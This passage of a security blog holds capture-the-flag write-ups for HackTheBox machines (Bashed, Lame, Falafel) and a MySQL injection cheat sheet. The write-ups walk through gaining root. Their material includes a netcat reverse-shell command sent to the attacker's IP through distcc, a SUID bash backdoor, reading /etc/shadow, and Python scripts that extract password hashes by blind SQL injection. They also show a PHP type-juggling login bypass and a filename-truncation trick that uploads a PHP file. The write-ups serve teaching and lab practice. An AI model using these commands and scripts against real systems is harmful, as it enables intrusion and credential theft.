scriptmanager.\nChecking manually whether the scripts\u0026rsquo; output was correct or not, it indeed was, and then successfully spawning a shell as scriptmanager. Awesome, we have managed to escalate our privileges.\nPrivilege Escalation 2 - scriptmanager to root Out of habit I always do certain manual checks like sudo -l, checking the contents of the / directory and /home directory.\nAlthough we found something to go on with, let\u0026rsquo;s run the enumeration script, LinEnum, again anyway but as scriptmanager now. It is important to note that running an enumeration script as per different users will yield some different outputs as the privileges and access will differ from one another.\nUpon execution of the script, we find nothing. In this case you would either switch to another script and then if that doesn\u0026rsquo;t provide you anything you would start enumerating manually, like looking for files owned by this user or by the groups this user is a part of, because this user, especially with a name like \u0026ldquo;scriptmanager\u0026rdquo;, gotta do something with some scripts right?\nWe will run LinPeas, which you can download from here, script on the target.\nWe start sifting through the information dumped out by the script upon execution and find some interesting folder and file owned:\nLet\u0026rsquo;s take a look at the contents of the /scripts directory and the files in it:\nIt looks like a cron job is running as root which is executing the python file and all the python file is doing as of now is echoing \u0026ldquo;testing 123!\u0026rdquo; into the test.txt file. We can confidently say that it is being executed by root since the script is writing to a root owned file, test.txt, which ideally shouldn\u0026rsquo;t be possible unless the script is run under roots\u0026rsquo; context.\nWe have write access to the python file and so we can edit the file in whatever way we please. We will edit the file to make it give us a reverse shell. If it was a bash script I probably would have made it give me a bash backdoor.\nBefore we do any changes it is important that we do not modify the original file, although it wouldn\u0026rsquo;t matter in a CTF-like scenario, but it is a good habit to have for when you will actually be doing real life engagements.\nWe back up the original file and then create a new one with the same name. The normal python reverse shell is a command that is sent to the bash terminal but since here it will be run as python itself, we make slight modifications to ensure it doesn\u0026rsquo;t error out.\nChecking if the listener is active:\nAnd it looks like we already got the shell, and we have successfully escalated our privileges to root!\nLoot Lets\u0026rsquo; first make our root shell interactive just like before, and then let\u0026rsquo;s go get our loot.\nFirst we will go get the user flag\nNice, now lets\u0026rsquo; get the root flag\nGreat, we got both the flags. Apart from getting these two, I also always get the shadow file and SSH keys, whenever available. Since SSH wasn\u0026rsquo;t present here, we will only get the shadow.\nCommand sent:\ncat /etc/shadow | grep '\\$'\rEnsuring only actual accounts\u0026rsquo; hashes are grepped. Surprisingly, roots\u0026rsquo; hash did not get grepped.\nIt wasn\u0026rsquo;t a mistake, looks like root does not have a hash assigned to it. Upon doing a quick Google search it turns out that accounts which has \u0026ldquo;!\u0026rdquo; marked beside it is \u0026ldquo;locked.\u0026rdquo; Locking a Linux account means that although the account exists on the system, you cannot login as that account. If you are using the new Kali Linux, you would find that the same is present on it as well.\nLessons Learned Having a backdoor (phpbash web shell) lying on your publicly accessible server is a horrible idea and practice to follow. Leaving sensitive files on the server even though left unlinked promotes a fallacy that no one would be able to find it and that it is perfectly hidden. If a user account requires certain commands to be run as some other user, only those commands should be allowed rather than allowing any command to be run as another user. Following the principle of least privilege could have very much prevented us from escalating to scriptmanager. Having a script that is writable by a user, maybe a developer, and needed to be executed as root to perform a certain set of actions is sometimes a requirement that cannot be avoided for multitude of reasons. There will always be a trade-off between accessibility and security, functionality and security, and a bunch more. But what could help generally (considering this machine is inside some corporate network) is defense-in-depth. Defense-in-depth is another security principle that tells you that in order to protect something, leveraging multiple defenses in multiple layers would help protect your assets much better, especially when something cannot be \u0026ldquo;fixed\u0026rdquo; directly, than just depending on one thing and hoping it protects you from everything. To ensure that this script is not exploited, there are a few things that could be done: Note: I\u0026rsquo;m no blue teamer, there could a plethora of things that could be wrong with these suggestions or maybe a whole lot better way of doing things too. These are just an exchange of thoughts between some people (Zach, Advait) and I\nOnce the file is ready to perform the set of operations that it needs to, it should be owned by root and executed as root If any changes are to be made to the file, the change proposal should go through a proper change management process Once the change has been approved, the write permissions should either be provided on a temporary basis and before deploying the now changed file, the changes should be audited. Fin If you have any doubts, thoughts, or comments in general, feel free to hit me up. Take care and as always, keep hacking!\n","permalink":"http://localhost:1313/hackthebox/htb-bashed/","title":"HackTheBox - Bashed Writeup w/o Metasploit"},{"content":"HackTheBox - Lame Writeup w/o Metasploit Introduction Lame was the first machine on the HackTheBox platform, it is very much like any other Boot2Root machine but is good for beginners. Lame is a Linux machine and has rightfully rated as Easy by the platform. There are 2 ways to own the machine and a false positive which may or may not lead to a rabbit hole, depending on the way you approach it.\nBox Details\rThis post is structured in the way I tackled this machine instead of grouping every part and dumping it. Let\u0026rsquo;s jump in.\nReconnaissance Before starting with any machine, I always create a directory and some sub directories as follows to help maintain structure:\nI usually create an \u0026ldquo;exploit\u0026rdquo; sub-directory too, but I forgot this time.\nI will start by doing recon of the machine, and will begin with a few nmap scans as always.\nGeneral Enumeration Starting with an initial nmap scan, to get the top 1000 ports.\nnmap -Pn -n -oN nmap/initial 10.10.10.3\rWe can see that from the top 1000 ports, few are open:\nPort 21 - FTP Port 22 - SSH Port 139 - SMB Port 445 - SMB Let\u0026rsquo;s make some notes!\nSince port 22 is open, it is most likely a Linux machine. Port 21 and 139, 445 are both some type of file sharing protocols, so maybe we might be working with some internal files or could leverage this to upload our malicious files.\nLet\u0026rsquo;s get more information before we speculate any further. Running an all ports scan in the background while we poke around these few ports ourselves.\nnmap -Pn -n -p- -oN nmap/allports 10.10.10.3\rFTP Enumeration While the scan is running, let\u0026rsquo;s take a look at the FTP banner.\nWe use telnet to grab the banner, FTP version running is - vsFTPd 2.3.4\nSSH Enumeration Now that we have FTPs\u0026rsquo; banner, lets get SSHs\u0026rsquo; banner.\nGreat, we have the SSH version with us. Good thing about getting SSH version is you get the OS running on the target machine too. We search the exact SSH version on Google and get the following result from one of the pages:\nThe term \u0026ldquo;hardy-security\u0026rdquo; catches my eye, let\u0026rsquo;s look a little further. Let\u0026rsquo;s search for \u0026ldquo;Ubuntu hardy\u0026rdquo;.\nAnd we found the OS that is running - Ubuntu Hardy 8.04 LTS, a very old OS.\nSMB Enumeration Now that SSHs\u0026rsquo; enumeration is done, let\u0026rsquo;s move on to SMBs\u0026rsquo; enumeration.\nLooks like we have read and write access to one of the shares - /tmp. Though when we try to connect, it errors out.\nTurns out smbclient has made it harder to work with insecure versions of the protocol, one way to get around this without messing up the configuration file is by stating the protocols accepted in the command itself.\nCommand sent:\nsmbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'\rNothing looks interesting. Let\u0026rsquo;s go and check if the all ports scan has finished yet or not. Also since we know that this machine is ancient, we will also run a Nmap vulnerability scan as it\u0026rsquo;s very likely to be vulnerable by multiple issues.\nGeneral Enumeration Contd. Let\u0026rsquo;s check the all ports scan we had started.\nThe scan has been finished and turns out we have one more service running on this machine - distccd\nLet\u0026rsquo;s run a targeted scan on all the ports found using default scripts and version scanning.\nWe didn\u0026rsquo;t really find anything new, let\u0026rsquo;s move on to the vulnerability scan.\nCommand sent:\nnmap -Pn -n -p21,22,139,445,3632 --script vuln -sV -oN nmap/vuln_scan 10.10.10.3\rOutput:\nOut of all the output, this was the most interesting one. Looks like we have RCE through the distcc service.\nExploit Lookup We already know that we have an RCE on hand, but nonetheless let\u0026rsquo;s perform further enumeration on all the services, especially to find any known public exploits for each service, if available.\nFTP Let\u0026rsquo;s look for any public exploits available for vsFTPd 2.3.4\nLooks like there\u0026rsquo;s one exploit for the exact version number, and it is also a RCE which is great.\nSSH Upon searching for publicly known exploits for the OpenSSH service, there weren\u0026rsquo;t any found. So we\u0026rsquo;ll cross out SSH from out list of things to look for, unless we get some creds or keys from somewhere.\nSMB Let\u0026rsquo;s look for any public exploits available for SMB 3.0.20\nIf you look up exploits for \u0026ldquo;smb\u0026rdquo;, you won\u0026rsquo;t find much, so ensure to look up the exploits for \u0026ldquo;samba\u0026rdquo;. From the list of exploits, only the second exploit fits our need. We can say this with confidence due to few reasons:\nThe version fits in The exploit is a Command Execution If you look over to the exploit path, you see that this is a remote exploit. Thus we have another RCE on hand. The first exploit just looks like some bypass The last exploit is a Denial of Service, which we certainly want to avoid at all costs. Initial Foothold Let\u0026rsquo;s test out each exploit we found sequentially, we will analyse the MSF modules and then exploit the services manually.\nExploiting vsFTPd RCE Let\u0026rsquo;s go through the MSF module on exploit-db.\nBy going through the exploit, it turns out that this version of the vsFTP contained a backdoor when released to the public. It can be invoked by sending a \u0026ldquo;:)\u0026rdquo; in the USER parameter.\nPassword can be anything, it is irrelevant. Knowing an actual user in the service is not required.\nBy sending those credentials, the backdoor opens a bind shell on port 6200.\nOnce the backdoor is detected by checking if the port 6200 is open or not, Metasploit sends a payload to connect to it.\nLooks simple enough to test and exploit it manually, so let\u0026rsquo;s do that.\nPayload is sent, now let\u0026rsquo;s try connect to the port 6200 of the target to see if it\u0026rsquo;s open and do we get connected to it or not.\nUnfortunately the port cannot be reached, and our connection times out. We will no longer focus on this service.\nExploiting Samba RCE A tip, when you want to view a exploit that searchsploit printed out in the results, you can use -x flag of searchsploit to view its\u0026rsquo; contents.\nsearchsploit -x unix/remote/16320.rb\rUpon checking the MSF module, it is just connecting to the service normally, except the username part.\nAll we have to do is send a reverse shell command in the username parameter and catch the shell. Let\u0026rsquo;s test it.\nSending the payload in the username field:\nEnsuring my listener is on to catch it:\nI do get a shell, but it turns out to be my own machine. Another way to login is by using logon command in the smb prompt.\nEnsuring my listener is on to catch the shell:\nAnd it looks like we are already root.\nExploiting Distcc RCE Before we go any further, let\u0026rsquo;s take a look at what distcc itself is.\nAccording to Gentoo wiki, \u0026ldquo;Distcc is a program designed to distribute compiling tasks across a network to participating hosts. It is comprised of a server, distccd, and a client program, distcc.\u0026rdquo;\nWe know that Nmap automatically tested this vulnerability out for us by sending the UID of the user the program is running under, but how do we change that? By using nmap script args.\nIf we check which script Nmap ran, it shows that \u0026ldquo;distcc-cve2004-2687\u0026rdquo;, let\u0026rsquo;s check it online to find it on one of the Nmap script pages.\nBy searching that exact term, we find the Nmap script page:\nNot only does it tells us the command to be used but also provides us with an example. If you take a closer look, you\u0026rsquo;ll realise that there\u0026rsquo;s a minor disparity in the name of the script in the example and the one that Nmap actually used. So accordingly, we\u0026rsquo;ll have to send an argument parameter as well.\nLet\u0026rsquo;s test it again, but we\u0026rsquo;ll send some other commands to ensure that the vulnerability actually exists and that this service is exploitable.\nThe hostname and the IP address of the target is exactly what was expected and so we can conclude that this service is indeed exploitable.\nCommand sent:\nnmap -Pn -n -p3632 --script distcc-cve2004-2687 --script-args=\u0026quot;distcc-cve2004-2687.cmd='nc 10.10.14.4 443 -e /bin/bash'\u0026quot; 10.10.10.3\rWe ensure our listener is active.\nAnd we got a low privileged shell on our hand. If you wanted to do this in a better way, you could send a cmd argument of which nc in the Nmap distcc script to check if nc is actually on the target machine or not before asking it send you a reverse shell. If it wasn\u0026rsquo;t present and we did not test, it would have caused you some headache as to why it was not returning shell and what are you doing wrong.\nPrivilege Escalation Let\u0026rsquo;s check the home directories.\nThere\u0026rsquo;s only one users home directory present, and user.txt is readable. We\u0026rsquo;ll get it once we\u0026rsquo;re root.\nNext step is to check for odd directories in the root, /, directory. Nothing there. Next is to check for odd crons, again nothing.\nSince this machine is old, a kernel exploit is very likely. Let\u0026rsquo;s check the kernel version running, and details of the OS too.\nThe OS info that we gathered from the SSH version was right.\nLet\u0026rsquo;s look for kernel exploits using searchsploit.\nWe won\u0026rsquo;t take any exploit with \u0026ldquo;x86\u0026rdquo; or \u0026ldquo;x86_64\u0026rdquo; mentioned in it as from the uname -a command we know that the architecture the target is running is \u0026ldquo;i686\u0026rdquo;. That helps in reducing the list.\nThe last three exploits ruled out. The fourth exploit will be at the last of our list if not completely ruled out since upon inspection the \u0026ldquo;supported targets\u0026rdquo; author mentioned were all 64-bit which our target is not.\nWe have two UDEV exploits, I\u0026rsquo;ll only try the C file, and a sock_sendpage() exploit. Let\u0026rsquo;s test both the exploits one by one.\nThe first exploit - sock_sendpage(), did not work as intended. Moving to the UDEV C exploit.\nWe transfer the exploit and compile it. Since there were no instructions, the exploit will be compiled as is.\nThe exploit has a usage section, which is great.\nWe need UDEVs\u0026rsquo; PID to execute this binary on, and it will execute any file named \u0026ldquo;run\u0026rdquo; in the tmp directory. Let\u0026rsquo;s get the PID first.\nWe found the PID in both ways, which happens to be 2687. Now let\u0026rsquo;s put a malicious file, /tmp/run, before executing this exploit.\nI was having a hard time creating the file in the target so I created it on my attacking machine.\nIf it\u0026rsquo;s not obvious, this file is a bash script that will copy the /bin/bash binary to /tmp/backdoor and turn its SUID and GUID bits on by changing the permissions to 6755. Since this operation will be carried out by root itself, a chown operation is not required.\nWe\u0026rsquo;ll transfer this malicious script to the target machine in the tmp directory and make it executable.\nNow that the malicious file is ready, we\u0026rsquo;ll execute the exploit binary\nUpon execution we check the contents of /tmp and we see that our \u0026ldquo;backdoor\u0026rdquo; is ready. To leverage this, we\u0026rsquo;ll have to make use of a special flag in bash which ensures the EUID (Effective User ID) is maintained and those privileges aren\u0026rsquo;t dropped upon execution.\nUpon executing ./backdoor -p which is now a bash SUID, it maintained the roots privileges and opened a new shell as root. We could have achieved the same using dash in which we wouldn\u0026rsquo;t have had to provide any additional flag and still would have gotten the root shell.\nThere are easier way of doing things, for example, we could have just made a file with a nc reverse shell command in it and open a new listener and catch the shell that way. But this is much nicer way of doing it in my opinion, I like to open as less amount of connections as possible.\nLet\u0026rsquo;s go get our loot.\nLessons Learned It\u0026rsquo;s essential to perform a detailed enumeration process to be able to find and leverage the entire attack surface at your disposal. Perform complete scan of the target Perform manual enumeration while scans are running in the background to understand more about the machine Use the newly gathered information to perform even more targeted enumeration Efficiently ruling out exploits from searchsploit output Patch and update your system and services regularly. Disable services that are not required, and/or employ firewall to restrict access to internal services. ","permalink":"http://localhost:1313/hackthebox/htb-lame/","title":"HackTheBox - Lame Writeup w/o Metasploit"},{"content":"MySQL Injection cheatsheet Testing checklist Name Character Function Single quote ' String terminator Semi colon ; Query terminator Comment -- - Removes the rest of the query Comment # Removes the rest of the query Comment /*comment this*/ Can be placed anywhere in a query, used for bypassing weak filters Single quote with a comment '-- - End a string and remove rest of the query Single quote, semi colon and a comment ';-- - End a string, end query, and remove rest of the query OR operator OR 1=1-- - For integers, true test OR operator OR 1=2-- - For integers, false test OR operator ' OR '1'='1'-- - For strings, test test AND operator AND 1=1-- - For integers, true test AND operator AND 1=2-- - For integers, false test AND operator ' AND '1'='1'-- - For strings, true test Arithmetic ?id=2-1 For integers, arithmetic operation would load the resultant post Sleep function OR sleep(5)-- - Blind test Functions Function Description database() Get the name of the working database user() Get the name of the user operating on the working database version() MySQL version concat() Concatenate two or more strings per row group_concat() Concatenate all the strings in one row substring('string'/\u0026lt;column_name\u0026gt;,\u0026lt;offset\u0026gt;,\u0026lt;length\u0026gt;) Get a part of the value of a string or column ord() Convert the value to ordinal (decimal) Number of Columns Method Description ORDER BY 3-- - For numbers. If column index provided exceeds the number of column present in the table, there will be an error ' ORDER BY 3-- - For string. If column index provided exceeds the number of column present in the table, there will be an error UNION SELECT 1,2,3-- - For numbers. It will throw an error till right number of columns haven\u0026rsquo;t been \u0026ldquo;SELECT\u0026quot;ed Database Contents Works with UNION queries\nGet the tables present in your working database:\nSELECT table_name FROM information_schema.tables WHERE table_schema=database()\rOnce you get the tables, you can get the columns from those tables:\nSELECT column_name FROM information_schema.columns WHERE table_name='x'\rWildcards: Get any table which consists the term \u0026ldquo;user\u0026rdquo; anywhere:\nSELECT table_name FROM information_schema.tables WHERE table_name like %user%\rGet any column which consists the term \u0026ldquo;user\u0026rdquo; in it:\nSELECT column_name FROM information_schema.columns WHERE column_name like %user%;\r/* Get columns along with its respective tables */\rSELECT GROUP_CONCAT(column_name,0x3a,table_name,'\\r\\n') FROM information_schema.columns WHERE column_name like %user%;\rFin If you found some mistake, or would like me to add something, feel free to contact me :)\nOther DB SQL injection cheatsheets will be added soon.\n","permalink":"http://localhost:1313/sqli-cheatsheet/","title":"MySQL Injection Cheatsheet"},{"content":"HackTheBox - Falafel Writeup w/o Metasploit Introduction Falafel is a retired HackTheBox machine and one of the most interesting machines I have hacked on the platform. It is a Linux machine with some really fun vulnerabilities to exploit. The machine is rated hard but the author was kind enough to give us hints as we hack through it. The machine requires you to know a range of nuances from SQLi to Linux filesystems. Let\u0026rsquo;s jump right in.\nReconnaissance General Enumeration We\u0026rsquo;ll start our reconnaissance with few nmap scans. Starting with the initial scan.\nWe see that we have two services on our hand: SSH and HTTP. Since SSH is present, you can fairly guess that it\u0026rsquo;s a Linux machine. Let\u0026rsquo;s perform our targeted scan on these two ports.\nFrom the SSH version information we can say that the OS is potentially Ubuntu Xenial 16.04 LTS. With the Apache server version our guess gets stronger. We get a custom title, which is nice but in the robots.txt it shows that the web server wanna hide some text files, so let\u0026rsquo;s look for text files.\nSSH Enumeration Another way we could have gotten the SSH verion:\nWe can see that there\u0026rsquo;s no other information other than that.\nHTTP Enumeration Another way we could have gotten HTTP server version is using curl:\nIn the first page itself it seems like we have some PHP files on our hand, which is nice.\nLet\u0026rsquo;s enumerate the web for text files using gobuster, which would look for directories too:\ngobuster dir -u 10.10.10.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -o go_med_txt\rNothing can catch my attention faster than \u0026ldquo;cyberlaw.txt\u0026rdquo;. As a side note, don\u0026rsquo;t do crime.\nFrom the text file we get a lot of information. Turns out there are two users on this website admin and chris, and chris is able to login as admin without knowing admins\u0026rsquo; credential (could be an SQLi) as well as gain access to the machine. There are a lot of mail addresses on this message, but apparently no mail service is found, could be something internal.\nWebsite Access Blind Boolean SQL Injection - Extracting Passwords Identification After going through application, /login.php was the only endpoint with which a user can interact, and with a database that too.\nSending admin : admin\nLooks like we can do user enumeration.\nUser Enumeration Let\u0026rsquo;s assume that we did not know that a user named chris existed, we could enumerate for users existed on this website using wfuzz\nwfuzz -c -d \u0026quot;username=FUZZ\u0026amp;password=n00bsec\u0026quot; -w /usr/share/seclists/Usernames/Names/names.txt -u http://10.10.10.73/login.php\rNow that we know that wfuzz works, and we can guess that it\u0026rsquo;s not possible for every user came consecuively from the wordlist is not possible, let\u0026rsquo;s filter results as per number of characters - 7074\nwfuzz -c -d \u0026quot;username=FUZZ\u0026amp;password=n00bsec\u0026quot; -w /usr/share/seclists/Usernames/Names/names.txt -u http://10.10.10.73/login.php --hh 7074\rTesting We\u0026rsquo;ll start with testing now.\nTesting with a single-quote first. Sending admin':admin\nTry again.. error.\nLet\u0026rsquo;s test a single-quote and a comment. We\u0026rsquo;ll comment out after the single-quote and see if that changes anything.\nWe get Wrong identification : admin error again. With this we can say that we have an sql injection on our hand.\nExploitation Next step would be get the number of columns, but UNION is blocked regardless of what you do or try any kind of bypass. We could use ORDER BY to get the number of columns but clearly this is not an error-based SQL injection. Since we cannot use UNION, getting the number of columns does not make sense.\nAlthough we cannot dump credentials out on the screen, it does not mean we cannot extract data out.\nSince this is a SQL database, we could use substring - substring(string, position, length) function. As the name suggests, substring function takes a \u0026ldquo;string\u0026rdquo;, or a column (like in this case), along with position, and length, and prints out the characters of a string (or column) from the position and length you specify.\nLet\u0026rsquo;s test it with the username field to get a gist, since we know that \u0026ldquo;admin\u0026rdquo; exist\nIt\u0026rsquo;s important to keep in mind that when our SQL injection is working, we get the error \u0026ldquo;Wrong identification\u0026rdquo;, and when it does not, we get an error \u0026ldquo;Try again\u0026rdquo;.\nSimilarly, we can extract the hashes of the users present in here.\nWe\u0026rsquo;ll test for [a-f0-9] (because hashes) for each character position for the password column, and if we get the error \u0026ldquo;Wrong identification\u0026rdquo;, then it would indicate that for position X the password column has that character.\nHash Extraction - BurpSuite Edition This can be done in BurpSuite Intruder, even in Community Edition which is what I use, let\u0026rsquo;s take a look at finding the first character of the admin\u0026rsquo;s hash.\nFirst we select a login request in BurpSuite and \u0026ldquo;Send it to intruder\u0026rdquo; and set our payload position:\nNext step to set a payload, we\u0026rsquo;ll select Brute Forcer. Modify the character set, as below:\nTo make our life easier, we could put the \u0026ldquo;right\u0026rdquo; error string in the \u0026ldquo;Grep Match\u0026rdquo; section so that the request that matches as per our error will get marked.\nWe\u0026rsquo;re now ready to \u0026ldquo;Start Attack\u0026quot;ing. Once we do, we soon find that the first character of the admins\u0026rsquo; hash is zero (0). We can now pause the attack since we already got what we needed from this injection.\nWe were successfully able to leverage BurpSuite Intruder to extract the first character of admins\u0026rsquo; hash and can see that it is \u0026ldquo;0\u0026rdquo; (Zero).\nHash Extraction - Python Edition Note: Link to the scripts are at the bottom\nAlthough this is nice and we can perform a little more tweaking and get the entire hash, it would be a LOT faster if we whipped up a script of our own and got this done, which is what we will be doing now.\nI wrote a script in python to get the admin\u0026rsquo;s hash.\n# Importing necessary library\rimport requests\r# This function generates SQL injection payload to fetch the hash, for each index (i) and character (c) passed to the function\rdef SQLpayload(i,c):\rreturn \u0026quot;admin' AND substring(password,%s,1)='%s'-- -\u0026quot; % (i,c)\r# All the characters in a hash\rcharacters = 'abcdef0123456789'\rpassword = '' # Blank password string\r# Loop through every index position : 1 to 32\rfor i in range(1,33):\r# Loop through every character in the \u0026quot;characters\u0026quot; for each index position\rfor c in characters:\r# Defining a payload to be sent to the server\rpayload = {'username':SQLpayload(i,c), 'password':'n00bsec'}\r# Sending a post request with the above payload and it's data and response is saved in \u0026quot;r\u0026quot;\rr = requests.post('http://10.10.10.73/login.php',data=payload)\r# Checking if \u0026quot;right\u0026quot; error is hit at an index for a character\rif \u0026quot;Wrong identification\u0026quot; in r.text:\r# If right error is hit, add the character to the password string\rpassword += c\r# Print the character on the screen without adding a \u0026quot;\\n\u0026quot; - newline\rprint(c,end='',flush=True)\r# No need to cycle through the rest of the characters if the \u0026quot;right\u0026quot; error is already hit for an index position\rbreak\r# Print the hash\rprint('\\nHash is:\\t'+password+'\\n')\rOnce we run the script we get the admin users\u0026rsquo; hash.\nAlthough this script works, it takes quite some time to run. So I created another script which would perform some extra queries to the database before it checks whether a character is in users\u0026rsquo; hashs\u0026rsquo; X position or not.\nThe first check is to find if the character in X position is an alphabet or not. If so, it is checked if it belongs to [a-f] group or the rest. If it\u0026rsquo;s a hash, it\u0026rsquo;ll always belong to a-f group which is \u0026ldquo;alpha1\u0026rdquo; in the below code. If it\u0026rsquo;s not an alphabet, it\u0026rsquo;s checked if the number belongs to [0-4] group or [5-9]. Once the group is sent back, SQLstring is used to generate payloads for characters in only those groups for X position. This reduces the amount of requests sent to the server, and we extract the hash much faster.\nThese checks are done using \u0026ldquo;ord\u0026rdquo;. Ordinal numbers are just decimal numbers. We convert the output of the substring to ord and perform a check if it\u0026rsquo;s greater than 58, ascii(9) = decimal(57), thus checking if the character in that position is an alphabet.\nNumbers (dec hex ascii) Alphabets (dec hex ascii) Check out man ascii to view the entire table.\nimport requests\rdef SQLstring(i,c):\r# We only want 1 password character at a time\r# Final payload will look like (example 1st chars)\r# username:admin' AND substring(password,1,1)='a'\rreturn \u0026quot;admin' AND substring(password,%s,1)='%s'-- -\u0026quot; % (i,c)\rdef SQLsplit(i):\r# Checking if the character is an alphabet\rsql = \u0026quot;admin' AND ord(substring(password,%s,1)) \u0026gt; '58'-- -\u0026quot; % i\rpayload = {'username':sql, 'password':'abcd'}\rr = requests.post('http://10.10.10.73/login.php', data=payload)\rif \u0026quot;Wrong identification\u0026quot; in r.text:\r# Checking if it's beyond \u0026quot;f\u0026quot;\rsql = \u0026quot;admin' AND ord(substring(password,%s,1)) \u0026gt; '102'-- -\u0026quot; % i\rpayload = {'username':sql, 'password':'abcd'}\rr = requests.post('http://10.10.10.73/login.php', data=payload)\rif \u0026quot;Wrong identification\u0026quot; in r.text:\rreturn \u0026quot;alpha2\u0026quot;\relse:\r# If not beyond \u0026quot;f\u0026quot;\rreturn \u0026quot;alpha1\u0026quot;\r# Character is a number\relse:\r# Checking if number is less than \u0026quot;5\u0026quot;\rsql = \u0026quot;admin' AND ord(substring(password,%s,1)) \u0026lt; '53'-- -\u0026quot; % i\rpayload = {'username':sql, 'password':'abcd'}\rr = requests.post('http://10.10.10.73/login.php', data=payload)\rif \u0026quot;Wrong identification\u0026quot; in r.text:\rreturn \u0026quot;num1\u0026quot;\relse:\r# If number is greater than 5\rreturn \u0026quot;num2\u0026quot;\r# password could be in hashed format or plaintext\ralpha1 = 'abcdef'\ralpha2 = 'ghijklmnopqrstuvwxyz'\rnum1 = '01234'\rnum2 = '56789'\r# Password variable\rpasswd = ''\rfor i in range(1,33):\rif SQLsplit(i) == \u0026quot;alpha1\u0026quot;:\rfor a in alpha1:\rpayload = {'username':SQLstring(i,a), 'password':'abcd'}\rr = requests.post('http://10.10.10.73/login.php', data=payload)\rif \u0026quot;Wrong identification\u0026quot; in r.text:\rpasswd += a\rprint(a,end='',flush=True)\rbreak\relif SQLsplit(i) == \u0026quot;alpha2\u0026quot;:\rfor a in alpha2:\rpayload = {'username':SQLstring(i,a), 'password':'abcd'}\rr = requests.post('http://10.10.10.73/login.php', data=payload)\rif \u0026quot;Wrong identification\u0026quot; in r.text:\rpasswd += a\rprint(a,end='',flush=True)\rbreak\relif SQLsplit(i) == \u0026quot;num1\u0026quot;:\rfor n in num1:\rpayload = {'username':SQLstring(i,n), 'password':'abcd'}\rr = requests.post('http://10.10.10.73/login.php', data=payload)\rif \u0026quot;Wrong identification\u0026quot; in r.text:\rpasswd += n\rprint(n,end='',flush=True)\rbreak\relse:\rfor n in num2:\rpayload = {'username':SQLstring(i,n), 'password':'abcd'}\rr = requests.post('http://10.10.10.73/login.php',data=payload)\rif \u0026quot;Wrong identification\u0026quot; in r.text:\rpasswd += n\rprint(n,end='',flush=True)\rbreak\r# print('\\n')\rprint('\\nPass or Hash is:\\t'+passwd+'\\n')\rThe above script is not perfect, maybe you could make it even more dynamic.\nRunning this script to get the admins\u0026rsquo; hash:\nBy making a script with extra checks, it helped us save 38 seconds for just one account, if there were a lot of accounts in here that would add up to some considerable amount of time saved.\nMade necessary changes and then fetched chris\u0026rsquo; hash:\nFor the second user we were only able to save a meagre 2 seconds, but it\u0026rsquo;s still something right? ¯\\_(ツ)_/¯\nYou might wonder if making such a large script compared to the earlier one is worth it, especially for a CTF. The answer is mostly no since the first works just fine. Making a more finer and dynamic script would improve your scripting skills, which is a very important skill to have in the industry and so developing scripts is encouraged.\nNow that we have found both the hashes, let\u0026rsquo;s crack them. We successfully crack the chris\u0026rsquo; hash and a password - juggling but unable to crack admins\u0026rsquo; hash. Let\u0026rsquo;s check out chris\u0026rsquo; account while we are at it.\nThere\u0026rsquo;s nothing much here, except some more hints towards cracking admins\u0026rsquo; hash - PHP Type Juggling.\nPHP Type Juggling - Cracking Admins\u0026rsquo; Hash In the \u0026ldquo;cyberlaw.txt\u0026rdquo; file, we saw that chris was able to log into admins\u0026rsquo; account without knowing the password and it certainly wasn\u0026rsquo;t an SQL injection to bypass authentication. Chris\u0026rsquo;s password hints at juggling and his account tells us that he works as a juggler and that sometimes both the hobby and work have something in common.\nBut let\u0026rsquo;s say we didn\u0026rsquo;t have any of those hints to point towards PHP type juggling.\nWhen we take a closer look at admins\u0026rsquo; hash, it does look a bit odd. It looks more like a massive number than a hash, and this massive number corresponding to 0 * 104620.. resulting to , you guessed it, 0 (zero). If you wanna try to get a number like that, take a calculator and multiply two biggest numbers the calculator can fit in and look at the result.\nThis by default wouldn\u0026rsquo;t introduce any kind of vulnerability, but PHP is a \u0026ldquo;loosely-typed\u0026rdquo; language. A loosely-typed language is one wherein there is no mention of datatype when defining a variable. Now since no datatype is specified, PHP will try to convert one thing to another (string to integer, integer to float, etc.) when loose comparisons (\u0026quot;==\u0026rdquo;) are used.\nLoose comparisons would convert one thing to another and then perform comparison, rather than performing the comparison as-is. So when a string (admins\u0026rsquo; hash) is loosely compared to a number, PHP would convert it to a number first (causing the admin hash to become 0 (zero)) and then it will perform the comparison. If we send in any other thing whose hash look like admins\u0026rsquo; - \u0026ldquo;0e\u0026hellip;\u0026rdquo; it would also result in zero, both the hashes would \u0026ldquo;match\u0026rdquo;, and PHP will log us in.\nIf you want to learn more about PHP type juggling, PHP Magic Tricks: Type Juggling is a good talk (pdf) to checkout\nLet\u0026rsquo;s look for a number that would also result in a similar \u0026ldquo;0e..\u0026rdquo; like hash to send to the PHP. The reason why we\u0026rsquo;re looking for something would result in that hash instead of justing sending 0 is because PHP would be converting whatever we send in to a hash first, and hash of 0 won\u0026rsquo;t give us what we want.\nUpon searching \u0026ldquo;php 0e hash collision\u0026rdquo;, I find a page which has some strings and number listed that result in \u0026ldquo;0e\u0026hellip;\u0026rdquo; type hash.\nLet\u0026rsquo;s try \u0026ldquo;240610708\u0026rdquo; and see if it logs us in as admin.\nAnd we successfully log in as admin. We are immediately presented with an upload functionality, which from \u0026ldquo;cyberlaw.txt\u0026rdquo; we know is vulnerable.\nInitial Access - Exploiting Upload Functionality First step to understand something is to use as an end-user would.\nUploading a legitimate image \u0026ldquo;google.png\u0026rdquo; to the server\nWe now know that it\u0026rsquo;s using wget functionality of the linux to get the file.\nActually uploads the file as is.\nUnfortunately you cannot keep some weird name of the file to upload as and inject the wget command that the server is running. Another thing we could do is see what would happen if we give it a file which is 255 characters long. In Linux, almost all the file related commands are restricted at 255 character length.\nCreated a 255 character long string using msf pattern create, remove last 4 characters and then create a png file.\nStart a HTTP server, I\u0026rsquo;m using a python3 server, and upload the file.\nLet\u0026rsquo;s see how the file is saved as, since the uploaded files\u0026rsquo; name has been shortened.\nTo get the offset, file length, we only care about the last 4 characters.\nWe found the offset of the unique string uploaded, thus the filename will get shortened if length increases from 232 characters removing any extension present.\nCreated a string with 232 A\u0026rsquo;s ( python -c \u0026quot;'A'*232\u0026quot; ) and appended \u0026ldquo;test.png\u0026rdquo;, created a file as that name, and uploaded it.\nChecking how it is saved as.\nIt has stripped the extension out. Let\u0026rsquo;s rename the existing test file, replacing \u0026ldquo;test\u0026rdquo; with \u0026ldquo;.php\u0026rdquo;. The file has contents as follows, and is uploaded.\nChecking how it is saved as.\nWe have successfully saved the file with PHP extension. Let\u0026rsquo;s 